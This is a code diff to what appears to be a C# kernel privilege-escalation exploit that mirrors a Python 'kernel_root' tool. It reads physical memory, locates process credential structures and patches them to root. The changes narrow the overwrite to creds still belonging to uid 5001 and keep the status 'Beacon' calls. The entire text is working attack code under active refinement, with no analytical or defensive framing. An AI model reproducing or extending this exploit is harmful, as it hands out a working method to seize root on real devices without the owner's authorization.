@@ -297,9 +297,9 @@ internal static class Program
     }
 
     // Mirror of kernel_root._sane_cred: a real cred lives in the direct map, has
-    // a small refcount and plausible ids.  Without this, a bogus real_parent that
-    // still looks like a kernel pointer and points at a uid-0 cred (init's, for
-    // one) would be patched - the Python side has always checked this.
+    // Pointer-shape validation only: a real cred lives in the direct map, has a
+    // small refcount and plausible ids.  Whether it is OURS is PatchCred's job
+    // (uid == 5001); Python's _sane_cred is the same shape check.
     static bool SaneCred(uint phys)
     {
         if (phys < 0x20000000 || phys >= 0x60000000 || (phys & 3) != 0) return false;
@@ -317,6 +317,13 @@ internal static class Program
     static bool PatchCred(uint cred)
     {
         if (cred >= 0xC0000000) cred = V2P(cred);
+        // M4: only ever write a cred that is still OURS (uid 5001). A cred that
+        // already reads 0 is rooted - either ours from an earlier pass, or (if a
+        // bogus real_parent slipped through) init's. Writing it would touch a
+        // foreign cred for nothing, so it counts as "already done".
+        uint uid;
+        try { uid = U32(ReadPhys(cred + 4, 4), 0); } catch { return false; }
+        if (uid != 5001) return false;
         if (!SaneCred(cred)) return false;
         try
         {
@@ -682,8 +689,8 @@ internal static class Program
                     try { sc = U32(ReadPhys(V2P(self) + O_CRED, 4), 0); } catch { }
                     try { sr = U32(ReadPhys(V2P(self) + O_REAL, 4), 0); } catch { }
                     Beacon("self cred=" + sc.ToString("x8") + " real=" + sr.ToString("x8"));
-                    if (CredUid(sc) == 5001 || CredUid(sc) == 0) PatchCred(sc);
-                    if (Kptr(sr) && sr != sc && (CredUid(sr) == 5001 || CredUid(sr) == 0)) PatchCred(sr);
+                    if (CredUid(sc) == 5001) PatchCred(sc);
+                    if (Kptr(sr) && sr != sc && CredUid(sr) == 5001) PatchCred(sr);
                     Beacon("self-patch uid=" + getuid());
                 }
 
@@ -703,14 +710,13 @@ internal static class Program
                         uint cred = 0, real = 0;
                         try { cred = U32(ReadPhys(V2P(parent) + O_CRED, 4), 0); } catch { }
                         try { real = U32(ReadPhys(V2P(parent) + O_REAL, 4), 0); } catch { }
-                        if (CredUid(cred) == 5001 || CredUid(cred) == 0)
+                        if (CredUid(cred) == 5001)
                         {
                             Beacon("direct-parent+" + po.ToString("x") + "=" +
                                    parent.ToString("x8") + " cred=" + cred.ToString("x8"));
                             PatchCred(cred);
                         }
-                        if (Kptr(real) && real != cred &&
-                            (CredUid(real) == 5001 || CredUid(real) == 0))
+                        if (Kptr(real) && real != cred && CredUid(real) == 5001)
                             PatchCred(real);
                         if (getuid() == 0) break;
                     }
@@ -739,8 +745,8 @@ internal static class Program
                         try { cred = U32(ReadPhys(V2P(parent) + O_CRED, 4), 0); } catch { }
                         try { real = U32(ReadPhys(V2P(parent) + O_REAL, 4), 0); } catch { }
                         Beacon("parent=" + parent.ToString("x8") + " cred=" + cred.ToString("x8"));
-                        if (CredUid(cred) == 5001 || CredUid(cred) == 0) PatchCred(cred);
-                        if (Kptr(real) && real != cred && (CredUid(real) == 5001 || CredUid(real) == 0)) PatchCred(real);
+                        if (CredUid(cred) == 5001) PatchCred(cred);
+                        if (Kptr(real) && real != cred && CredUid(real) == 5001) PatchCred(real);
                         Beacon("parent-patch uid=" + getuid());
                         if (getuid() == 0) break;
                     }
